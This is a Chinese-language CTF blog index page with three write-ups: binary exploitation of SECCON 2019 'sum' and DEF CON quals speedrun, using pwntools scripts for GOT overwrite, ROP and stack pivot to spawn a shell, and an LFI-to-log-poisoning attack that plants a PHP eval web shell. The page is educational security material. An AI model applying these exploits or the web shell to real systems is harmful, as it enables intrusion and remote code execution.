<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Antel0p3&#39;s blog</title>
  <meta name="author" content="John Doe">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>Antel0p3&#39;s blog<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		wubba lubba dub dub.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/10/14/seccon2019-sum-wp/" >nightmare 7.2.3.seccon2019-sum-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-10-14
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/17-stack_pivot/seccon19_sum">相关资源</a>  </p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec sum</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">  __int64 v4[<span class="number">5</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 *v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v5 = &amp;v6;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[sum system]\nInput numbers except for 0.\n0 is interpreted as the end of sequence.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[Example]\n2 3 4 0&quot;</span>);</span><br><span class="line">  read_ints(v4, <span class="number">5LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)sum(v4, v5) &gt; <span class="number">5</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%llu\n&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>read_ints   结合main中<code>13# read_ints(v4, 5LL);</code>可以看到实际上读入了6个八字  覆盖了main中的<code>v5</code>指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">read_ints</span><span class="params">(__int64 *a1, __int64 a2)</span> &#123;</span><br><span class="line">  __int64 i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= a2; ++i ) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;a1[i]) != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !a1[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sum   结合main中<code>14# sum(v4, v5)</code>可以看到 是将数组中的数求和，存到v5指向的内存空间   返回相加的数字的个数</p>
<p>main中 如果相加的个数大于5  则exit  否则调用printf</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sum</span><span class="params">(__int64 *a1, _QWORD *a2)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  *a2 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a1[i]; ++i ) &#123;</span><br><span class="line">    v2 = i;</span><br><span class="line">    *a2 += a1[v2];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>明显可以通过写入6个数 来实现任意地址写（第6个为目标地址，6个求和为目标值）   但只能写一次，如何实现多次写入呢？  </p>
<p>因为相加个数为6个  所以会exit   可以将<code>main</code>写入<code>exit@got</code> 这样就可以多次写入了</p>
<p>紧接着又有问题  没有可以直接泄露libc基址或stack地址的地方  怎么获取shell呢？</p>
<p>最开始想到的是 直接partial_overwrite <code>printf@got</code>中的低字节  使其成为one_gadget的地址   但是仍然有12bit的随机性  概率比较低</p>
<p>观察到执行到<code>call printf</code>时  栈顶的内容就是我们输入的数字  因此可控   那么可以在改写<code>printf@got</code>为<code>pop xxx; ret</code>（因为call会push进一个地址）然后接着使用ROP  输出puts真实地址  获取libc基址  然后再一次就是system的ROP了</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">proc = process(<span class="string">&quot;./sum&quot;</span>, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so&quot;</span>&#125;)</span><br><span class="line">belf = ELF(<span class="string">&quot;./sum&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr, con</span>):</span><br><span class="line">    payload = <span class="string">f&#x27;<span class="subst">&#123;con-<span class="number">4</span>-addr&#125;</span> <span class="subst">&#123;<span class="number">1</span>&#125;</span> <span class="subst">&#123;<span class="number">1</span>&#125;</span> <span class="subst">&#123;<span class="number">1</span>&#125;</span> <span class="subst">&#123;<span class="number">1</span>&#125;</span> <span class="subst">&#123;addr&#125;</span>&#x27;</span>.encode()</span><br><span class="line">    sla(<span class="string">b&#x27;0&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b * 0x0000000000400987</span></span><br><span class="line"><span class="string">    b * 0x00000000004009BF</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> + <span class="string">&#x27;c\n&#x27;</span> * <span class="number">4</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">main = belf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">exit_got = belf.got[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">printf_got = belf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">puts_got = belf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_ret = <span class="number">0x0000000000400a43</span></span><br><span class="line">ret = <span class="number">0x00000000004005ee</span></span><br><span class="line">puts_plt = belf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">write(exit_got, main)</span><br><span class="line">write(printf_got, rdi_ret)</span><br><span class="line">payload = <span class="string">f&#x27;<span class="subst">&#123;rdi_ret&#125;</span> <span class="subst">&#123;puts_got&#125;</span> <span class="subst">&#123;puts_plt&#125;</span> <span class="subst">&#123;<span class="built_in">str</span>(<span class="number">0x4009a7</span>)&#125;</span> 0&#x27;</span>.encode()	<span class="comment"># 这里注意0x4009a7是call exit的指令地址  不直接用main或exit是因为会导致栈不对齐而crash</span></span><br><span class="line">sla(<span class="string">b&#x27;0&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc_base = ga() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ls(<span class="string">&quot;libc base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">binsh_str = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;<span class="subst">&#123;rdi_ret&#125;</span> <span class="subst">&#123;binsh_str&#125;</span> <span class="subst">&#123;system&#125;</span> <span class="subst">&#123;<span class="built_in">str</span>(<span class="number">0x4009a7</span>)&#125;</span> 0&#x27;</span>.encode()</span><br><span class="line">sla(<span class="string">b&#x27;0&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>



	
	</div>
  <a type="button" href="/2023/10/14/seccon2019-sum-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/10/13/HNCTF2022-easyInclude-wp/" >HNCTF2022-easy_include-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-10-13
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2948">题目链接</a>   </p>
<h2 id="日志注入getshell"><a href="#日志注入getshell" class="headerlink" title="日志注入getshell"></a>日志注入getshell</h2><blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/my1e3/p/5854897.html">https://www.cnblogs.com/my1e3/p/5854897.html</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//WEB手要懂得搜索</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=/i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>明显禁用了php:&#x2F;&#x2F;和data:&#x2F;&#x2F;伪协议   那么可以用file:&#x2F;&#x2F;来查看文件</p>
<p>由文件头可知是nginx服务器   nginx的配置文件为<code>/etc/nginx/nginx.conf</code>  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=/etc/nginx/nginx.conf</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># error_log  /var/log/nginx/error.log warn;</span></span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure>

<p>可以看到日志文件位于<code>/var/log/nginx/</code>中   访问<code>/var/log/nginx/access.log</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">x.x.x.x - - [13/Oct/2023:11:18:25 +0000] &quot;GET / HTTP/1.1&quot; 200 1534 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;</span></span><br><span class="line"><span class="comment">x.x.x.x - - [13/Oct/2023:11:18:25 +0000] &quot;GET /?file=/etc/nginx/nginx.conf HTTP/1.1&quot; 200 1534 &quot;http://node5.anna.nssctf.cn:28888/&quot; &quot;Mozilla/5.0 (</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>可见成功include并获取日志内容  其中包括：IP， url路径，状态码和user-agent</p>
<p>那么有两种方式写入木马：</p>
<ol>
<li><p>url <code>?file=&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code>  </p>
<p>注意这里如果直接浏览器改url部分字符会被编码，写入日志也是编码后的结果无法生效   因此需burp抓包修改</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/10/13/HNCTF2022-easyInclude-wp/0x1.png?raw=true" alt="img"></p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/10/13/HNCTF2022-easyInclude-wp/0x2.png?raw=true" alt="img"></p>
</li>
<li><p>user-agent</p>
<p>user-agent 直接用hackbar改也行  这里不用考虑编码问题</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/10/13/HNCTF2022-easyInclude-wp/0x3.png?raw=true" alt="img"></p>
</li>
</ol>

	
	</div>
  <a type="button" href="/2023/10/13/HNCTF2022-easyInclude-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/10/10/dcquals2019-speedrun-wp/" >nightmare 7.2.1.dcquals2019-speedrun-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-10-10
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/17-stack_pivot/dcquals19_speedrun4">相关资源</a>  </p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec speedrun </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+2h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  IO_puts(<span class="string">&quot;how much do you have to say?&quot;</span>);</span><br><span class="line">  _libc_read(<span class="number">0</span>, buf, <span class="number">9uLL</span>);</span><br><span class="line">  buf[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  len = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> IO_puts(<span class="string">&quot;That&#x27;s not much to say.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">257</span> )</span><br><span class="line">    <span class="keyword">return</span> read_len((<span class="type">unsigned</span> <span class="type">int</span>)len);</span><br><span class="line">  <span class="keyword">return</span> IO_puts(<span class="string">&quot;That&#x27;s too much to say!.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果大小在1-257之内 则调用<code>read_len</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_len</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  IO_puts(<span class="string">&quot;Ok, what do you have to say for yourself?&quot;</span>);</span><br><span class="line">  _libc_read(<span class="number">0</span>, buf, a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(</span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;Interesting thought \&quot;%s\&quot;, I&#x27;ll take it into consideration.\n&quot;</span>,</span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">int</span>)buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>buf长为256  明显可以溢出一个字节到<code>old_rbp</code>  从而利用stack pivot</p>
<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>将<code>old_rbp</code>最低位更改为0x00  进而ret后会跳转到0x08来执行  gdb调试分析发现多数情况下都在buf内部  也就是可以在buf内布置ROP然后跳转执行</p>
<p>但因为没法泄露  不知道具体的写入位置   可以通过多个<code>ret</code>来到达同样的地址执行ROP</p>
<p>因此也不是每次都能成功  有一定概率   依赖于栈顶地址</p>
<p>还有就是没有现成的<code>/bin/sh</code>  需要自己调用read函数写到bss段上然后利用</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./speedrun&quot;</span>)</span><br><span class="line">belf = ELF(<span class="string">&quot;./speedrun&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span 